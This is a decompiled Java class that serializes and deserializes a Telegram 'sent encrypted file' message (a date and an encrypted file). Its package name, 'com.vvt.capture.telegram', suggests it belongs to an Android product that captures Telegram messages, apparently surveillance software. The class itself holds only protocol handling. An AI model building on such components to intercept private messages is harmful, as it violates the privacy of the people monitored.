package com.vvt.capture.telegram.internal;

public class TLRPC$TL_messages_sentEncryptedFile
  extends TLRPC.messages_SentEncryptedMessage
{
  public static int constructor = -1802240206;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.date = i;
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    TLRPC.EncryptedFile localEncryptedFile = TLRPC.EncryptedFile.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.file = localEncryptedFile;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    i = this.date;
    paramAbstractSerializedData.writeInt32(i);
    this.file.serializeToStream(paramAbstractSerializedData);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messages_sentEncryptedFile.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */